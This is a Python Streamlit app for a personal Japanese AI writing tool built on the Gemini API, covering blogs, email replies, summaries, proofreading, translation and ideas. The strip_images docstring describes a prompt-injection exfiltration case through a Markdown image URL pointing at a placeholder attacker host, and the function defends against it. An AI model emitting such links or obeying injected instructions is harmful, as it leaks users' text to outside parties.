"""AIライティングツール(個人用) - Streamlit + Gemini API"""
import re
from datetime import datetime

import streamlit as st
from google import genai
from google.genai import types

st.set_page_config(page_title="AIライティングツール", page_icon="✍️", layout="wide")

MODELS = ["gemini-3.8-flash"]  # APIキーがあれば利用可能なモデルを自動取得して置き換える
BASE_SYSTEM = (
    "あなたは優秀な日本語ライター兼編集者です。"
    "指示された成果物の本文だけを出力し、前置きや言い訳、「承知しました」等の挨拶は書かないでください。"
)

TONES = ["丁寧", "カジュアル", "フォーマル(ビジネス)", "親しみやすい", "論理的・専門的", "熱量が高い"]


# ---------------------------------------------------------------- Gemini
@st.cache_data(ttl=3600, show_spinner=False)
def fetch_models(key: str) -> list[str]:
    """APIキーで使えるgeminiモデル一覧を取得(失敗時は空)。"""
    try:
        client = genai.Client(api_key=key)  # 変数に保持しないとGCでクローズされる
        names = [
            m.name.removeprefix("models/")
            for m in client.models.list()
            if "generateContent" in (m.supported_actions or [])
            and m.name.startswith("models/gemini-")
            and not any(x in m.name for x in ("image", "omni", "nano", "tts", "live", "audio", "robotics", "computer"))
        ]
        return sorted(names, key=lambda n: (n != MODELS[0], n), reverse=False)
    except Exception:
        return []


_IMG_INLINE = re.compile(r"!\[([^\]]*)\]\([^)]*\)")
_IMG_REF = re.compile(r"!\[([^\]]*)\]\[[^\]]*\]")


def strip_images(text: str) -> str:
    """モデル出力から画像記法を除去する。
    貼り付けた外部文章に仕込まれた指示で `![](https://攻撃者/?q=内容)` が出力されると、
    描画しただけで内容が外部に送信されてしまう(Markdown経由の情報流出)ため。"""
    return _IMG_REF.sub(lambda m: m.group(1), _IMG_INLINE.sub(lambda m: m.group(1), text))


def get_client() -> genai.Client | None:
    key = (st.session_state.get("api_key") or "").strip()
    return genai.Client(api_key=key) if key else None


def stream_generate(prompt: str, system: str = BASE_SYSTEM):
    client = get_client()
    cfg = types.GenerateContentConfig(
        system_instruction=system, temperature=st.session_state.get("temperature", 0.7)
    )
    for chunk in client.models.generate_content_stream(
        model=st.session_state.get("model") or MODELS[0], contents=prompt, config=cfg
    ):
        if chunk.text:
            yield chunk.text


def run(label: str, prompt: str, system: str = BASE_SYSTEM):
    """生成してストリーム表示し、履歴に保存、結果を表示する。"""
    if get_client() is None:
        st.error("先にサイドバーでGemini APIキーを入力してください。")
        return
    box = st.empty()
    text = ""
    try:
        with st.spinner("生成中..."):
            for part in stream_generate(prompt, system):
                text += part
                box.markdown(strip_images(text) + "▌")
    except Exception as e:  # APIエラー(キー不正・制限など)を画面に出す
        st.error(f"生成に失敗しました: {e}")
        return
    box.empty()
    text = strip_images(text)
    st.session_state.setdefault("history", []).insert(
        0, {"time": datetime.now().strftime("%m/%d %H:%M"), "label": label, "text": text}
    )
    show_result(text, label)


def show_result(text: str, label: str):
    st.subheader("結果")
    st.markdown(text)
    with st.expander("コピー用テキスト(右上のアイコンでコピー)"):
        st.code(text, language=None, wrap_lines=True)
    st.download_button("📥 .txtで保存", text, file_name=f"{label}_{datetime.now():%Y%m%d_%H%M}.txt")
    st.caption(f"文字数: {len(text):,}")


# ---------------------------------------------------------------- 各機能
def page_blog():
    st.header("📝 ブログ記事作成")
    theme = st.text_input("テーマ・タイトル案", placeholder="例: 在宅ワークの集中力を上げる方法")
    c1, c2, c3 = st.columns(3)
    target = c1.text_input("想定読者", placeholder="例: 20代の会社員")
    tone = c2.selectbox("文体", TONES)
    length = c3.select_slider("文字数目安", [1000, 2000, 3000, 5000], value=2000)
    keywords = st.text_input("含めたいキーワード(カンマ区切り・任意)")
    notes = st.text_area("構成メモ・伝えたいこと・体験談など(任意)", height=120)
    mode = st.radio("出力", ["記事全文", "構成案(見出しのみ)"], horizontal=True)
    if st.button("生成する", type="primary", key="blog") and theme.strip():
        what = "SEOを意識したブログ記事の全文(タイトル、導入、見出し付き本文、まとめ)" if mode == "記事全文" else "ブログ記事の構成案(タイトル案3つ、見出し構成、各見出しの要点)"
        run("ブログ", f"""次の条件で{what}をMarkdownで作成してください。
- テーマ: {theme}
- 想定読者: {target or '指定なし'}
- 文体: {tone}
- 文字数目安: 約{length}字
- 含めるキーワード: {keywords or '指定なし'}
- 補足メモ: {notes or 'なし'}""")


def page_email():
    st.header("✉️ メール返信作成")
    received = st.text_area("受信したメール", height=200)
    intent = st.text_area("返信で伝えたい内容(箇条書きでOK)", height=100, placeholder="例: 日程は来週火曜なら可能/資料は明日送る")
    c1, c2 = st.columns(2)
    tone = c1.selectbox("トーン", ["丁寧(ビジネス)", "フォーマル", "フランク", "お詫び", "お断り(角が立たない)", "お礼"])
    n = c2.radio("案の数", [1, 3], horizontal=True)
    if st.button("返信を作る", type="primary", key="mail") and received.strip():
        run("メール返信", f"""以下の受信メールへの返信文を{n}案作成してください。件名(Re:)も付けてください。
{'案ごとに「案1」「案2」「案3」と見出しを付け、ニュアンスを変えてください。' if n > 1 else ''}
- トーン: {tone}
- 返信で伝えたい内容: {intent or '文脈から適切に判断'}

【受信メール】
{received}""")


def page_summary():
    st.header("📄 要約")
    src = st.text_area("要約したい文章", height=260)
    c1, c2 = st.columns(2)
    style = c1.selectbox("形式", ["箇条書き", "1段落の文章", "3行要約", "要点+詳細(見出し付き)", "TL;DR+アクションアイテム"])
    size = c2.select_slider("長さ", ["短く", "標準", "詳しく"], value="標準")
    if st.button("要約する", type="primary", key="sum") and src.strip():
        run("要約", f"次の文章を「{style}」形式で、{size}要約してください。原文にない情報は足さないでください。\n\n{src}")


def page_proof():
    st.header("🔍 校正・推敲")
    src = st.text_area("文章", height=240)
    mode = st.radio("モード", ["誤字脱字・文法のチェック(修正点の解説つき)", "読みやすくリライト", "文章を短く簡潔に", "もっと魅力的に・説得力を上げる"])
    if st.button("実行", type="primary", key="proof") and src.strip():
        extra = "修正後の全文を先に示し、そのあと主な修正点を箇条書きで解説してください。" if mode.startswith("誤字") else "意味は変えず、改善後の文章のみ出力してください。"
        run("校正", f"次の文章に対し「{mode}」を行ってください。{extra}\n\n{src}")


def page_rewrite():
    st.header("🎭 文体変換・翻訳")
    src = st.text_area("元の文章", height=220)
    c1, c2 = st.columns(2)
    kind = c1.selectbox("変換", ["文体を変える", "日本語→英語", "英語→日本語", "日本語→中国語", "日本語→韓国語"])
    tone = c2.selectbox("文体(変換先)", TONES + ["ですます調", "だ・である調", "小学生にもわかる説明"]) if kind == "文体を変える" else None
    if st.button("変換", type="primary", key="rw") and src.strip():
        task = f"次の文章を「{tone}」の文体に書き換えてください。" if tone else f"次の文章を自然な表現で翻訳({kind})してください。"
        run("変換", f"{task}\n\n{src}")


def page_ideas():
    st.header("💡 アイデア出し")
    kind = st.selectbox("種類", ["ブログ・記事タイトル案", "キャッチコピー", "SNS投稿文(X/Instagram)", "メールの件名案", "ブログネタ出し"])
    topic = st.text_area("テーマ・内容", height=120)
    n = st.slider("案の数", 3, 15, 8)
    if st.button("案を出す", type="primary", key="idea") and topic.strip():
        run("アイデア", f"次の内容について「{kind}」を{n}個、番号付きで提案してください。切り口を変えて多様にしてください。\n\n{topic}")


def page_history():
    st.header("🕘 履歴(このセッション)")
    hist = st.session_state.get("history", [])
    if not hist:
        st.info("まだ履歴はありません。")
    for h in hist:
        with st.expander(f"[{h['time']}] {h['label']} — {h['text'][:30].replace(chr(10), ' ')}…"):
            st.markdown(h["text"])
            st.code(h["text"], language=None, wrap_lines=True)


PAGES = {
    "📝 ブログ記事": page_blog,
    "✉️ メール返信": page_email,
    "📄 要約": page_summary,
    "🔍 校正・推敲": page_proof,
    "🎭 文体変換・翻訳": page_rewrite,
    "💡 アイデア出し": page_ideas,
    "🕘 履歴": page_history,
}

# ---------------------------------------------------------------- サイドバー
with st.sidebar:
    st.title("✍️ AIライティング")
    page = st.radio("機能", list(PAGES), label_visibility="collapsed")
    st.divider()
    st.text_input(
        "Gemini APIキー",
        type="password",
        key="api_key",
        placeholder="AIza...",
        help="ご自身で取得したキーを入力してください。キーはこのブラウザのセッション内でのみ使われ、保存されません。",
    )
    _key = (st.session_state.get("api_key") or "").strip()
    if not _key:
        st.info("使用前にAPIキーを入力してください。\n\n[Google AI Studioで無料取得](https://aistudio.google.com/apikey)")
    _models = (fetch_models(_key) if _key else []) or MODELS
    st.selectbox("モデル", _models, key="model", disabled=not _key)
    st.slider("創造性(temperature)", 0.0, 1.5, 0.7, 0.1, key="temperature")

if not (st.session_state.get("api_key") or "").strip():
    st.warning("👈 サイドバーにGemini APIキーを入力すると使えるようになります。")

PAGES[page]()
